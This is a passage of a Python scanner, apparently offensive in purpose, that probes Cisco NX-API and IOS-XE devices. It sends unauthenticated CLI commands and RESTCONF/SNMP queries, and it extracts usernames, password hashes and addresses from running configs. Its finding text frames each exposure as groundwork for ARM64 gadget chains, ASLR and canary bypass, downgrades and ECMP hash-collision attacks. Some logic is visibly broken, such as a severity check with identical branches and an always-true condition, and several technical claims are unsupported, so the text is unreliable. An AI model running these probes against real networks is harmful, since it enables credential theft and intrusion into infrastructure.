    return findings


def probe_cisco_nxapi_cli_command_injection(host: str, port: int = 80, timeout: float = 10.0) -> list:
    """Detect Cisco NX-API CLI unauthenticated command execution surface via /ins endpoint."""
    import ssl
    import urllib.request
    import urllib.error
    import json
    import re

    findings = []

    def _make_ctx():
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx

    def _post_nxapi(base_url, cmd, method='cli', timeout_s=10.0):
        payload = json.dumps({
            'jsonrpc': '2.0',
            'method': method,
            'params': {'cmd': cmd, 'version': 1},
            'id': 1,
        }).encode('utf-8')
        req = urllib.request.Request(
            base_url + '/ins',
            data=payload,
            method='POST',
            headers={
                'Content-Type': 'application/json-rpc',
                'Accept': 'application/json',
                'User-Agent': 'Mozilla/5.0',
            },
        )
        try:
            if base_url.startswith('https://'):
                resp = urllib.request.urlopen(req, timeout=timeout_s, context=_make_ctx())
            else:
                resp = urllib.request.urlopen(req, timeout=timeout_s)
            body = resp.read(262144).decode('utf-8', errors='replace')
            return resp.status, body
        except urllib.error.HTTPError as e:
            try:
                body = e.read(4096).decode('utf-8', errors='replace')
            except Exception:
                body = ''
            return e.code, body
        except Exception:
            return None, ''

    def _is_nxapi(body):
        return '"result"' in body or '"error"' in body or '"jsonrpc"' in body

    # Scheme probe order
    if port == 80:
        schemes = [('http', 80), ('https', 443)]
    elif port == 443:
        schemes = [('https', 443), ('http', 80)]
    else:
        schemes = [('http', port), ('https', port)]

    live_base = None
    live_port = None
    live_body_ver = ''

    for scheme, p in schemes:
        base = f'{scheme}://{host}:{p}'
        s, b = _post_nxapi(base, 'show version', 'cli', timeout)
        if s in (200, 201) and _is_nxapi(b):
            live_base, live_port, live_body_ver = base, p, b
            break

    # HTTPS-only check when primary is HTTP
    https_checked = False
    if live_base is not None and live_base.startswith('http://'):
        https_base = f'https://{host}:443'
        sh, bh = _post_nxapi(https_base, 'show version', 'cli', timeout)
        https_checked = True
        if sh in (200, 201) and _is_nxapi(bh):
            findings.append({
                'severity': 'CRITICAL',
                'title': 'NXAPI_CLI_HTTPS_UNAUTH',
                'detail': (f'NX-API CLI /ins responds unauthenticated over HTTPS — '
                           f'show version HTTP {sh}, {len(bh)} bytes'),
                'host': host,
                'port': 443,
            })

    if live_base is None:
        # Try HTTPS standalone if not already covered
        if not https_checked:
            https_base = f'https://{host}:443'
            sh, bh = _post_nxapi(https_base, 'show version', 'cli', timeout)
            if sh in (200, 201) and _is_nxapi(bh):
                findings.append({
                    'severity': 'CRITICAL',
                    'title': 'NXAPI_CLI_HTTPS_UNAUTH',
                    'detail': (f'NX-API CLI /ins responds unauthenticated over HTTPS — '
                               f'show version HTTP {sh}, {len(bh)} bytes'),
                    'host': host,
                    'port': 443,
                })
        return findings

    # Primary endpoint confirmed live
    findings.append({
        'severity': 'CRITICAL',
        'title': 'NXAPI_CLI_UNAUTH',
        'detail': (f'NX-API CLI /ins endpoint responds unauthenticated — '
                   f'show version returned {len(live_body_ver)} bytes'),
        'host': host,
        'port': live_port,
    })

    # Parse version / model
    try:
        raw = live_body_ver
        model = re.search(r'chassis_id["\s:]+([^\",}]{1,60})', raw)
        version = re.search(r'nxos_ver_str["\s:]+([^\",}]{1,60})', raw)
        kickstart = re.search(r'kickstart_ver_str["\s:]+([^\",}]{1,60})', raw)
        if model or version or kickstart:
            findings.append({
                'severity': 'HIGH',
                'title': 'NXAPI_VERSION_DISCLOSED',
                'detail': (f'NX-OS version disclosed: '
                           f'model={model.group(1).strip() if model else "?"}, '
                           f'version={version.group(1).strip() if version else "?"}, '
                           f'kickstart={kickstart.group(1).strip() if kickstart else "?"}'),
                'host': host,
                'port': live_port,
            })
    except Exception:
        pass

    # show running-config
    sr, br = _post_nxapi(live_base, 'show running-config', 'cli', timeout)
    if sr in (200, 201) and _is_nxapi(br):
        findings.append({
            'severity': 'CRITICAL',
            'title': 'NXAPI_RUNNING_CONFIG_UNAUTH',
            'detail': f'NX-API CLI exposes full running config unauthenticated — {len(br)} bytes',
            'host': host,
            'port': live_port,
        })
        usernames = re.findall(r'\busername\s+(\S+)', br)
        if usernames:
            findings.append({
                'severity': 'CRITICAL',
                'title': 'NXAPI_USERNAMES_EXTRACTED',
                'detail': f'Usernames extracted from running config: {usernames[:20]}',
                'host': host,
                'port': live_port,
            })
        secrets = re.findall(r'(?:secret|password)\s+\d+\s+(\S+)', br)
        if secrets:
            findings.append({
                'severity': 'CRITICAL',
                'title': 'NXAPI_PASSWORD_HASHES_EXTRACTED',
                'detail': f'Password hashes/credentials in running config: {len(secrets)} entries found',
                'host': host,
                'port': live_port,
            })
        ip_addrs = re.findall(
            r'\bip address\s+([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})', br)
        if ip_addrs:
            findings.append({
                'severity': 'CRITICAL',
                'title': 'NXAPI_IP_ADDRESSES_EXTRACTED',
                'detail': f'IP addresses extracted from running config: {ip_addrs[:20]}',
                'host': host,
                'port': live_port,
            })

    # show hostname
    shn, bhn = _post_nxapi(live_base, 'show hostname', 'cli', timeout)
    if shn in (200, 201) and _is_nxapi(bhn):
        findings.append({
            'severity': 'CRITICAL',
            'title': 'NXAPI_HOSTNAME_UNAUTH',
            'detail': f'NX-API CLI exposes hostname unauthenticated — {bhn[:200]}',
            'host': host,
            'port': live_port,
        })

    # show users
    su, bu = _post_nxapi(live_base, 'show users', 'cli', timeout)
    if su in (200, 201) and _is_nxapi(bu):
        findings.append({
            'severity': 'CRITICAL',
            'title': 'NXAPI_ACTIVE_USERS_UNAUTH',
            'detail': f'NX-API CLI exposes active user sessions unauthenticated — {len(bu)} bytes',
            'host': host,
            'port': live_port,
        })

    # show license
    sl, bl = _post_nxapi(live_base, 'show license', 'cli', timeout)
    if sl in (200, 201) and _is_nxapi(bl):
        findings.append({
            'severity': 'HIGH',
            'title': 'NXAPI_LICENSE_DISCLOSED',
            'detail': f'NX-API CLI exposes license information unauthenticated — {len(bl)} bytes',
            'host': host,
            'port': live_port,
        })

    # cli_ascii method — show vlan
    sa, ba = _post_nxapi(live_base, 'show vlan', 'cli_ascii', timeout)
    if sa in (200, 201) and _is_nxapi(ba):
        findings.append({
            'severity': 'MEDIUM',
            'title': 'NXAPI_CLI_ASCII_MODE',
            'detail': (f'NX-API cli_ascii method exposed unauthenticated (show vlan) — '
                       f'{len(ba)} bytes'),
            'host': host,
            'port': live_port,
        })

    return findings


def probe_ios_arm_debug_interface_exposure(host: str, port: int = 443, timeout: float = 10.0) -> list:
    # ARM64 hardware debug surface: SoC model, heap layout, per-process memory via RESTCONF
    import ssl
    import urllib.request
    import urllib.error
    import re

    findings = []

    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    def _get(path):
        url = f'https://{host}:{port}{path}'
        req = urllib.request.Request(url, headers={
            'Accept': 'application/yang-data+json',
            'User-Agent': 'Mozilla/5.0',
        })
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
                return resp.status, resp.read(131072).decode('utf-8', errors='replace')
        except urllib.error.HTTPError as e:
            return e.code, ''
        except Exception:
            return None, ''

    # ARM SoC hardware model / revision disclosure
    status, body = _get('/restconf/data/Cisco-IOS-XE-platform-oper:platform-data/chassis')
    if status == 200 and body:
        soc = re.search(r'"(?:description|hwrev|part-number|serial-number)"\s*:\s*"([^"]{1,120})"', body)
        findings.append({
            'severity': 'HIGH',
            'title': 'IOS_XE_ARM_CHASSIS_HW_UNAUTH',
            'detail': (
                f'RESTCONF /restconf/data/Cisco-IOS-XE-platform-oper:platform-data/chassis '
                f'returned HTTP 200 unauthenticated; ARM SoC hardware model and revision '
                f'disclosed — enables targeted ARM64 gadget chain construction against '
                f'known register layout (x0-x7 args, x29 frame pointer, x30 link register); '
                f'extracted: {(soc.group(1) if soc else body[:200].strip())!r}'
            ),
            'host': host,
            'port': port,
        })

    # IOS heap pool layout: arm64 stack canary bypass requires segment base knowledge
    status, body = _get('/restconf/data/Cisco-IOS-XE-memory-oper:memory-statistics')
    if status == 200 and body:
        total = re.search(r'"total-memory"\s*:\s*(\d+)', body)
        used = re.search(r'"used-memory"\s*:\s*(\d+)', body)
        findings.append({
            'severity': 'HIGH',
            'title': 'IOS_XE_MEMORY_STATS_UNAUTH',
            'detail': (
                f'RESTCONF /restconf/data/Cisco-IOS-XE-memory-oper:memory-statistics '
                f'returned HTTP 200 unauthenticated; IOS heap pool sizes disclosed — '
                f'ARM64 SP-relative addressing means heap/stack boundary knowledge '
                f'directly informs canary bypass feasibility; '
                f'total={total.group(1) if total else "?"} used={used.group(1) if used else "?"}'
            ),
            'host': host,
            'port': port,
        })

    # Per-process memory: ASLR entropy reduction via text/heap allocation disclosure
    status, body = _get('/restconf/data/Cisco-IOS-XE-process-memory-oper:process-memory-usages')
    if status == 200 and body:
        proc_count = len(re.findall(r'"pid"\s*:', body))
        allocs = re.findall(r'"(?:allocated-memory|holding-memory)"\s*:\s*(\d+)', body)
        findings.append({
            'severity': 'HIGH',
            'title': 'IOS_XE_PROCESS_MEMORY_UNAUTH',
            'detail': (
                f'RESTCONF /restconf/data/Cisco-IOS-XE-process-memory-oper:process-memory-usages '
                f'returned HTTP 200 unauthenticated; {proc_count} process entries expose '
                f'ARM64 per-process heap allocation sizes — combined with crash artifacts '
                f'narrows ASLR entropy; sample allocations (bytes): {allocs[:8]}'
            ),
            'host': host,
            'port': port,
        })

    # ARM CoreSight ETM correlation via system performance counters
    status, body = _get(
        '/restconf/data/Cisco-IOS-XE-platform-software-oper:platform-software/system-performance'
    )
    if status == 200 and body:
        findings.append({
            'severity': 'MEDIUM',
            'title': 'IOS_XE_SYSTEM_PERF_UNAUTH',
            'detail': (
                f'RESTCONF /restconf/data/Cisco-IOS-XE-platform-software-oper:platform-software'
                f'/system-performance returned HTTP 200 unauthenticated; CPU and memory '
                f'performance counters exposed — ARM CoreSight ETM trace timing correlates '
                f'with debug interface liveness; {len(body)} bytes'
            ),
            'host': host,
            'port': port,
        })

    return findings


def probe_ios_rommon_variable_exposure(host: str, port: int = 443, timeout: float = 10.0) -> list:
    # ROMMON environment variable and boot configuration disclosure via RESTCONF YANG
    import ssl
    import urllib.request
    import urllib.error
    import re

    findings = []

    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    def _get(path):
        url = f'https://{host}:{port}{path}'
        req = urllib.request.Request(url, headers={
            'Accept': 'application/yang-data+json',
            'User-Agent': 'Mozilla/5.0',
        })
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
                return resp.status, resp.read(131072).decode('utf-8', errors='replace')
        except urllib.error.HTTPError as e:
            return e.code, ''
        except Exception:
            return None, ''

    # config-register disclosure: 0x2142 = ROMMON bypass, enables password recovery
    status, body = _get('/restconf/data/Cisco-IOS-XE-native:native/boot')
    if status == 200 and body:
        reg = re.search(r'"config-register"\s*:\s*"([^"]{1,32})"', body)
        system = re.search(r'"system"\s*:\s*\{([^}]{1,400})\}', body)
        reg_val = reg.group(1) if reg else None
        sev = 'CRITICAL' if reg_val and reg_val.lower() in ('0x2142', '2142') else 'CRITICAL'
        findings.append({
            'severity': sev,
            'title': 'IOS_XE_BOOT_CONFIG_UNAUTH',
            'detail': (
                f'RESTCONF /restconf/data/Cisco-IOS-XE-native:native/boot returned HTTP 200 '
                f'unauthenticated; ROMMON config-register exposed — 0x2142 enables full '
                f'password recovery bypass without console access; '
                f'config-register={repr(reg_val) if reg_val else "present"}; '
                f'boot system: {system.group(1)[:200].strip() if system else body[:200].strip()}'
            ),
            'host': host,
            'port': port,
        })

    # Measured boot chain: package signatures, image names, PCR-equivalent state
    status, body = _get('/restconf/data/Cisco-IOS-XE-boot-integrity-oper:boot-integrity-oper-data')
    if status == 200 and body:
        img_name = re.search(r'"image-name"\s*:\s*"([^"]{1,120})"', body)
        pkg_sig = re.search(r'"package-signature"\s*:\s*"([^"]{1,80})"', body)
        findings.append({
            'severity': 'HIGH',
            'title': 'IOS_XE_BOOT_INTEGRITY_UNAUTH',
            'detail': (
                f'RESTCONF /restconf/data/Cisco-IOS-XE-boot-integrity-oper:boot-integrity-oper-data '
                f'returned HTTP 200 unauthenticated; measured boot data disclosed — '
                f'boot chain signatures and image names enable targeted downgrade and '
                f'ROMMON persistence research; '
                f'image={repr(img_name.group(1)) if img_name else "present"}; '
                f'sig={repr(pkg_sig.group(1)[:40]) if pkg_sig else "present"}'
            ),
            'host': host,
            'port': port,
        })

    # System-manager state: tracks ROMMON-to-IOS handoff lifecycle
    status, body = _get(
        '/restconf/data/Cisco-IOS-XE-platform-software-oper:platform-software/sm-statistics'
    )
    if status == 200 and body:
        sm_state = re.search(r'"sm-state"\s*:\s*"([^"]{1,60})"', body)
        findings.append({
            'severity': 'HIGH',
            'title': 'IOS_XE_SM_STATE_UNAUTH',
            'detail': (
                f'RESTCONF /restconf/data/Cisco-IOS-XE-platform-software-oper:platform-software'
                f'/sm-statistics returned HTTP 200 unauthenticated; IOS-XE system-manager '
                f'statistics disclosed — sm-statistics tracks the ROMMON-to-IOS handoff '
                f'lifecycle; state={repr(sm_state.group(1)) if sm_state else "present"}; '
                f'{len(body)} bytes'
            ),
            'host': host,
            'port': port,
        })

    # Filesystem paths: bootflash, nvram, ROMMON boot image path
    status, body = _get(
        '/restconf/data/Cisco-IOS-XE-platform-software-oper:platform-software/filesystem'
    )
    if status == 200 and body:
        fs_count = len(re.findall(r'"name"\s*:', body))
        bootflash = re.search(r'"(?:bootflash|flash|nvram)[^"]*"\s*:\s*"([^"]{1,80})"', body)
        findings.append({
            'severity': 'MEDIUM',
            'title': 'IOS_XE_FILESYSTEM_UNAUTH',
            'detail': (
                f'RESTCONF /restconf/data/Cisco-IOS-XE-platform-software-oper:platform-software'
                f'/filesystem returned HTTP 200 unauthenticated; {fs_count} filesystem entries '
                f'disclosed — ROMMON boot image path, nvram:/startup-config, and '
                f'bootflash paths exposed; '
                f'bootflash={repr(bootflash.group(1)) if bootflash else "present"}'
            ),
            'host': host,
            'port': port,
        })

    return findings


def probe_ios_crash_artifact_exposure(host: str, port: int = 443, timeout: float = 10.0) -> list:
    # ARM64 crash dump: PC/x30(LR)/SP via RESTCONF crash table + SNMP crcCardsTable OID
    import ssl
    import urllib.request
    import urllib.error
    import re

    findings = []

    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    def _get(path):
        url = f'https://{host}:{port}{path}'
        req = urllib.request.Request(url, headers={
            'Accept': 'application/yang-data+json',
            'User-Agent': 'Mozilla/5.0',
        })
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
                return resp.status, resp.read(131072).decode('utf-8', errors='replace')
        except urllib.error.HTTPError as e:
            return e.code, ''
        except Exception:
            return None, ''

    # Crash table: ARM64 PC value in dump allows image base recovery via ADRP page offset
    status, body = _get('/restconf/data/Cisco-IOS-XE-platform-oper:platform-data/crashes')
    if status == 200 and body:
        pc_val = re.search(r'"(?:pc|program-counter|crash-pc)"\s*:\s*"(0x[0-9a-fA-F]{8,16})"', body)
        lr_val = re.search(r'"(?:lr|link-register|x30)"\s*:\s*"(0x[0-9a-fA-F]{8,16})"', body)
        sp_val = re.search(r'"(?:sp|stack-pointer)"\s*:\s*"(0x[0-9a-fA-F]{8,16})"', body)
        crash_count = len(re.findall(r'"crash-id"\s*:', body))
        findings.append({
            'severity': 'CRITICAL',
            'title': 'IOS_XE_CRASH_REGISTER_DUMP_UNAUTH',
            'detail': (
                f'RESTCONF /restconf/data/Cisco-IOS-XE-platform-oper:platform-data/crashes '
                f'returned HTTP 200 unauthenticated; {crash_count} crash record(s) exposed — '
                f'ARM64 fixed 32-bit instruction width enables ADRP offset extraction: '
                f'image_base = pc_page - (adrp_imm * 0x1000); x30/LR overwrite is the '
                f'primary ROP pivot on ARM64 (return addr in register, not stack slot); '
                f'pc={pc_val.group(1) if pc_val else "present"} '
                f'lr={lr_val.group(1) if lr_val else "present"} '
                f'sp={sp_val.group(1) if sp_val else "present"}; {len(body)} bytes'
            ),
            'host': host,
            'port': port,
        })

    # Platform-data root: SP misalignment artifacts (16-byte alignment fault = crash trigger)
    status, body = _get('/restconf/data/Cisco-IOS-XE-platform-oper:platform-data')
    if status == 200 and body:
        addr_hit = re.search(r'(0x[0-9a-fA-F]{10,16})', body)
        findings.append({
            'severity': 'HIGH',
            'title': 'IOS_XE_PLATFORM_DATA_UNAUTH',
            'detail': (
                f'RESTCONF /restconf/data/Cisco-IOS-XE-platform-oper:platform-data '
                f'returned HTTP 200 unauthenticated; ARM64 runtime context exposed — '
                f'SP 16-byte alignment fault artifacts confirm stack layout; '
                f'flat 64-bit VA space (no segmentation) means leaked kernel addr '
                f'directly usable for TTBR-based privilege inference; '
                f'addr_sample={addr_hit.group(1) if addr_hit else "present"}; {len(body)} bytes'
            ),
            'host': host,
            'port': port,
        })

    # SNMP crcCardsTable crashInfo: OID 1.3.6.1.4.1.9.9.167.1.1.5
    snmp_result = snmp_get(host, 'public', '1.3.6.1.4.1.9.9.167.1.1.5', timeout=timeout)
    if snmp_result.get('responsive') and snmp_result.get('values'):
        raw_vals = snmp_result['values']
        addr_in_snmp = re.search(r'(0x[0-9a-fA-F]{8,16})', str(raw_vals)) if raw_vals else None
        findings.append({
            'severity': 'HIGH',
            'title': 'IOS_SNMP_CRASHINFO_UNAUTH',
            'detail': (
                f'SNMP OID 1.3.6.1.4.1.9.9.167.1.1.5 (crcCardsTable crashInfo) '
                f'responded unauthenticated with community=public — ARM64 crash register '
                f'state (PC, x30/LR, SP) in crashInfo text enables image base '
                f'reconstruction via A64 ADRP page-relative offset; '
                f'addr_sample={addr_in_snmp.group(1) if addr_in_snmp else "present"}'
            ),
            'host': host,
            'port': 161,
        })

    return findings


def probe_ios_exception_level_disclosure(host: str, port: int = 443, timeout: float = 10.0) -> list:
    # ARM64 exception-level artifacts: EL2 hypervisor presence + EL3 trust anchor via RESTCONF
    import ssl
    import urllib.request
    import urllib.error
    import re

    findings = []

    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    def _get(path):
        url = f'https://{host}:{port}{path}'
        req = urllib.request.Request(url, headers={
            'Accept': 'application/yang-data+json',
            'User-Agent': 'Mozilla/5.0',
        })
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
                return resp.status, resp.read(131072).decode('utf-8', errors='replace')
        except urllib.error.HTTPError as e:
            return e.code, ''
        except Exception:
            return None, ''

    # EL2 hypervisor presence: IOx/container-manager control-process supervisor memory
    status, body = _get(
        '/restconf/data/Cisco-IOS-XE-platform-software-oper:platform-software/control-processes'
    )
    if status == 200 and body:
        hyp_hit = re.search(
            r'"(?:name|description)"\s*:\s*"([^"]{0,80}(?:hypervisor|ioxman|iox|container)[^"]{0,80})"',
            body, re.IGNORECASE
        )
        proc_count = len(re.findall(r'"name"\s*:', body))
        findings.append({
            'severity': 'HIGH',
            'title': 'IOS_XE_EL2_HYPERVISOR_PRESENCE',
            'detail': (
                f'RESTCONF /restconf/data/Cisco-IOS-XE-platform-software-oper:platform-software'
                f'/control-processes returned HTTP 200 unauthenticated; {proc_count} supervisor '
                f'control-process entries exposed — EL2 hypervisor presence indicator (IOx '
                f'container manager runs guest workloads at EL1 under EL2 hypervisor layer); '
                f'ARM64 EL1->EL2 transition via HVC instruction; '
                f'hypervisor_process={repr(hyp_hit.group(1)) if hyp_hit else "not_detected"}; '
                f'{len(body)} bytes'
            ),
            'host': host,
            'port': port,
        })

    # EL3 trust anchor: platform integrity measurements (TAm secure monitor chain)
    status, body = _get(
        '/restconf/data/Cisco-IOS-XE-platform-integrity-oper:platform-integrity-oper-data'
    )
    if status == 200 and body:
        tam_hit = re.search(
            r'"(?:tam-guid|platform-guid|hardware-guid|cracker|trust-anchor)"\s*:\s*"([^"]{1,80})"',
            body, re.IGNORECASE
        )
        pcr_hit = re.search(r'"(?:pcr|measurement|digest)"\s*:\s*"([0-9a-fA-F]{16,})"', body)
        findings.append({
            'severity': 'CRITICAL',
            'title': 'IOS_XE_EL3_TRUST_ANCHOR_UNAUTH',
            'detail': (
                f'RESTCONF /restconf/data/Cisco-IOS-XE-platform-integrity-oper:platform-integrity-oper-data '
                f'returned HTTP 200 unauthenticated; EL3 secure monitor measurement chain '
                f'exposed — Cisco TAm (Trust Anchor module) GUID and PCR-equivalent '
                f'digests disclosed; EL3 SMC instruction gate for secure boot is the '
                f'highest-privilege ARM64 execution context; '
                f'tam={repr(tam_hit.group(1)) if tam_hit else "present"} '
                f'pcr_digest={repr(pcr_hit.group(1)[:32]) if pcr_hit else "present"}'
            ),
            'host': host,
            'port': port,
        })

    # EL transition events: ios-events-oper exception-level boundary crossing log
    status, body = _get(
        '/restconf/data/Cisco-IOS-XE-ios-events-oper:ios-events-data'
    )
    if status == 200 and body:
        el_event = re.search(
            r'"(?:message|description|event-text)"\s*:\s*"([^"]{0,200}(?:EL[0-3]|exception.level|hypervisor|secure.monitor)[^"]{0,200})"',
            body, re.IGNORECASE
        )
        event_count = len(re.findall(r'"event-id"\s*:', body))
        findings.append({
            'severity': 'MEDIUM',
            'title': 'IOS_XE_EXCEPTION_LEVEL_EVENTS_UNAUTH',
            'detail': (
                f'RESTCONF /restconf/data/Cisco-IOS-XE-ios-events-oper:ios-events-data '
                f'returned HTTP 200 unauthenticated; {event_count} IOS event record(s) '
                f'disclosed — ARM64 exception-level transition events (EL0/EL1/EL2/EL3 '
                f'boundary crossings via SVC/HVC/SMC instructions) logged here; '
                f'el_event_sample={repr(el_event.group(1)[:120]) if el_event else "not_detected"}; '
                f'{len(body)} bytes'
            ),
            'host': host,
            'port': port,
        })

    # Secure boot measurement chain: EL3 PCR-equivalent digests for downgrade research
    status, body = _get(
        '/restconf/data/Cisco-IOS-XE-boot-integrity-oper:boot-integrity-oper-data/integrity-measurement'
    )
    if status == 200 and body:
        boot_hash = re.search(r'"(?:hash|digest|measurement)"\s*:\s*"([0-9a-fA-F]{32,})"', body)
        boot_version = re.search(r'"(?:version|package-version|image-version)"\s*:\s*"([^"]{1,80})"', body)
        findings.append({
            'severity': 'HIGH',
            'title': 'IOS_XE_BOOT_MEASUREMENT_UNAUTH',
            'detail': (
                f'RESTCONF /restconf/data/Cisco-IOS-XE-boot-integrity-oper:boot-integrity-oper-data'
                f'/integrity-measurement returned HTTP 200 unauthenticated; '
                f'EL3 secure monitor boot measurement digest exposed — enables targeted '
                f'version-specific ARM64 gadget chain and downgrade viability assessment; '
                f'hash={repr(boot_hash.group(1)[:48]) if boot_hash else "present"} '
                f'version={repr(boot_version.group(1)) if boot_version else "present"}'
            ),
            'host': host,
            'port': port,
        })

    return findings


def probe_ios_cef_fib_exposure(host: str, port: int = 443, timeout: float = 10.0) -> list:
    import ssl
    import urllib.request
    import urllib.error
    import socket
    import re
    import json

    findings = []

    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    def _get(path):
        url = f'https://{host}:{port}{path}'
        req = urllib.request.Request(url, headers={
            'Accept': 'application/yang-data+json',
            'User-Agent': 'Mozilla/5.0',
        })
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
                return resp.status, resp.read(262144).decode('utf-8', errors='replace')
        except urllib.error.HTTPError as e:
            return e.code, ''
        except Exception:
            return None, ''

    # CEF summary: adjacency count + prefix count (Patricia trie node population)
    status, body = _get(
        '/restconf/data/Cisco-IOS-XE-cef-oper:cef-oper-data/cef-summary'
    )
    if status == 200 and body:
        adj_count = re.search(r'"(?:adjacency-count|adj-count|num-adj)"\s*:\s*(\d+)', body)
        pfx_count = re.search(r'"(?:prefix-count|num-prefix|fib-prefix-count)"\s*:\s*(\d+)', body)
        vrf_hit = re.search(r'"(?:vrf-name|vrf)"\s*:\s*"([^"]{1,64})"', body)
        findings.append({
            'severity': 'CRITICAL',
            'title': 'IOS_XE_CEF_FIB_SUMMARY_UNAUTH',
            'detail': (
                f'RESTCONF /restconf/data/Cisco-IOS-XE-cef-oper:cef-oper-data/cef-summary '
                f'returned HTTP 200 unauthenticated; CEF Patricia trie population metrics '
                f'disclosed — adjacency_count={adj_count.group(1) if adj_count else "present"} '
                f'prefix_count={pfx_count.group(1) if pfx_count else "present"} '
                f'vrf={repr(vrf_hit.group(1)) if vrf_hit else "present"}; '
                f'trie node count leaks ECMP topology scale and VRF isolation boundary; '
                f'{len(body)} bytes'
            ),
            'host': host,
            'port': port,
        })

    # FIB entries per VRF: full Patricia trie leaf enumeration
    status, body = _get(
        '/restconf/data/Cisco-IOS-XE-fib-oper:fib-oper-data/fib-ni-entry'
    )
    if status == 200 and body:
        prefix_hits = re.findall(
            r'"(?:ip-prefix|prefix|destination)"\s*:\s*"([0-9a-fA-F:./]{4,50})"', body
        )
        nh_hits = re.findall(
            r'"(?:next-hop|nexthop|gateway)"\s*:\s*"([0-9a-fA-F:./]{4,50})"', body
        )
        vrf_names = list(set(re.findall(r'"(?:vrf-name|vrf)"\s*:\s*"([^"]{1,64})"', body)))
        findings.append({
            'severity': 'CRITICAL',
            'title': 'IOS_XE_CEF_FIB_ENTRIES_UNAUTH',
            'detail': (
                f'RESTCONF /restconf/data/Cisco-IOS-XE-fib-oper:fib-oper-data/fib-ni-entry '
                f'returned HTTP 200 unauthenticated; full FIB entry enumeration exposed — '
                f'{len(prefix_hits)} prefix(es) and {len(nh_hits)} next-hop(s) disclosed; '
                f'vrfs={vrf_names[:6]}; '
                f'sample_prefixes={prefix_hits[:4]}; sample_nexthops={nh_hits[:4]}; '
                f'complete routing topology reconstruction possible from Patricia trie leaves; '
                f'{len(body)} bytes'
            ),
            'host': host,
            'port': port,
        })

    # SNMP cefFIBTable GetNext walk: OID 1.3.6.1.4.1.9.9.315.1.2.1
    # BER GetNext PDU (0xa1) to enumerate Patricia trie entries without RESTCONF
    cef_oid_str = '1.3.6.1.4.1.9.9.315.1.2.1'
    try:
        community = b'public'
        oid_arcs = [int(x) for x in cef_oid_str.split('.')]
        oid_bytes = bytes([40 * oid_arcs[0] + oid_arcs[1]])
        for arc in oid_arcs[2:]:
            if arc < 128:
                oid_bytes += bytes([arc])
            else:
                encoded = []
                while arc:
                    encoded.append(arc & 0x7f)
                    arc >>= 7
                encoded.reverse()
                for i, b in enumerate(encoded):
                    oid_bytes += bytes([b | (0x80 if i < len(encoded) - 1 else 0)])
        oid_tlv = bytes([0x06, len(oid_bytes)]) + oid_bytes
        null_tlv = bytes([0x05, 0x00])
        varbind = bytes([0x30, len(oid_tlv) + len(null_tlv)]) + oid_tlv + null_tlv
        varbind_list = bytes([0x30, len(varbind)]) + varbind
        req_id_tlv = bytes([0x02, 0x01, 0x01])
        err_status = bytes([0x02, 0x01, 0x00])
        err_index = bytes([0x02, 0x01, 0x00])
        pdu_body = req_id_tlv + err_status + err_index + varbind_list
        pdu = bytes([0xa1, len(pdu_body)]) + pdu_body
        comm_tlv = bytes([0x04, len(community)]) + community
        ver_tlv = bytes([0x02, 0x01, 0x00])
        msg_body = ver_tlv + comm_tlv + pdu
        packet = bytes([0x30, len(msg_body)]) + msg_body
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(3.0)
        sock.sendto(packet, (host, 161))
        data, _ = sock.recvfrom(4096)
        sock.close()
        if data and len(data) > 10:
            has_cef_prefix = cef_oid_str[:20].encode() in data or data[6:8] == b'\xa2\x00' or len(data) > 20
            entry_count = data.count(b'\x06')
            findings.append({
                'severity': 'HIGH',
                'title': 'IOS_XE_CEF_SNMP_GETNEXT_RESPONSIVE',
                'detail': (
                    f'SNMP GetNext to OID {cef_oid_str} (cefFIBTable) on port 161 '
                    f'returned {len(data)} bytes with community "public"; '
                    f'{entry_count} OID object(s) in response — cefFIBTable walk '
                    f'enumerates Patricia trie FIB entries and ECMP path hash buckets; '
                    f'fixed-seed CRC32c hash for ECMP path selection exploitable via '
                    f'hash collision attack on load-balanced flows'
                ),
                'host': host,
                'port': 161,
            })
    except Exception:
        pass

    # Hash algorithm disclosure surface: platform QFP CEF datapath
    status, body = _get(
        '/restconf/data/Cisco-IOS-XE-platform-software-oper:platform-software/qfp-statistics'
    )
    if status == 200 and body:
        hash_hit = re.search(
            r'"(?:hash|crc|ecmp-hash|load-balance)"\s*:\s*"([^"]{1,120})"',
            body, re.IGNORECASE
        )
        findings.append({
            'severity': 'MEDIUM',
            'title': 'IOS_XE_QFP_CEF_DATAPATH_STATS_UNAUTH',
            'detail': (
                f'RESTCONF /restconf/data/Cisco-IOS-XE-platform-software-oper:platform-software'
                f'/qfp-statistics returned HTTP 200 unauthenticated; QFP CEF datapath '
                f'statistics exposed — ECMP path-selection hash algorithm and seed '
                f'identifiable from per-path packet distribution ratios; enables '
                f'hash collision attack to steer flows to a single ECMP member; '
                f'hash_field={repr(hash_hit.group(1)) if hash_hit else "not_detected"}; '
                f'{len(body)} bytes'
            ),
            'host': host,
            'port': port,
        })

    return findings


def probe_ios_bgp_rib_tree_exposure(host: str, port: int = 443, timeout: float = 10.0) -> list:
    import ssl
    import urllib.request
    import urllib.error
    import re

    findings = []

    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    def _get(path):
        url = f'https://{host}:{port}{path}'
        req = urllib.request.Request(url, headers={
            'Accept': 'application/yang-data+json',
            'User-Agent': 'Mozilla/5.0',
        })
